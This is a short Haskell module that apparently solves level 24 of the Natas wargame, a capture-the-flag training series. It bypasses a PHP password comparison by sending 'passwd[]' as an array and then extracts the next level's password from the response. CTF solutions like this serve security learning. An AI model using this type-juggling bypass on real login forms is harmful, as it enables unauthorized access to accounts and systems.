{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas24 where

import           Data.Text    (Text)
import           Safe         (headMay, lastMay)

import           Network.Wreq (param)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  req <- getLevel' 24 (parentUri 24) (param "passwd[]" .~ ["0"])
  attemptParse (reqBody req)

attemptParse :: Text -> IO (Maybe Text)
attemptParse body =
  let match = headMay (workupBody' extractPassword body)
  in pure $ match >>= lastMay
